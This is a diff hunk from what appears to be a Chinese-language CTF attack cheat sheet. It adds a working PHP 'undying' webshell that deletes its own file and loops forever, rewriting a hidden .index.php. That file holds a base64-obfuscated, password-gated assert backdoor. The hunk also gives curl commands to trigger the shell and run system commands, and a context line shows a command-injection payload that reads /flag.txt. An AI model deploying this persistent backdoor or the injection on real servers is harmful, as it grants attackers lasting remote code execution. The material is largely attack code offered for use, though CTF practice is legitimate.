@@ -211,6 +211,27 @@ POST:ipaddr=/tmp %26%26 cat /flag.txt
 
 ## 常规漏洞写不死马
 
+简单的不死马：
+**`.1.php`**
+```
+<?php unlink(".1.php");ignore_user_abort(true);set_time_limit(0);
+$code="PD9waHAgJG09ImFzIi4icyIuImVydCI7aWYgKG1kNSgkX1BPU1RbMl0pPT09JzEwOTcyZDcxOGMyMWZkYzg3MThlZmJhYThlNjc3NDBlJyl7JG0oJF9QT1NUWzFdKTt9Pz4=";
+/*
+<?php $m="as"."s"."ert";if (md5($_POST[2])==='10972d718c21fdc8718efbaa8e67740e'){$m($_POST[1]);}?>
+*/
+while(1){
+file_put_contents(".index.php",base64_decode($code));
+system("chmod 755 .index.php");
+sleep(0); 
+}
+?>
+```
+`
+curl 172.16.2.234:8011/.1.php
+curl 172.16.2.234:8011/.index.php -d "2=v5est0r&1=system('ls -al')"
+`
+
+
 ```
 <?php
 unlink($_SERVER['SCRIPT_FILENAME']);
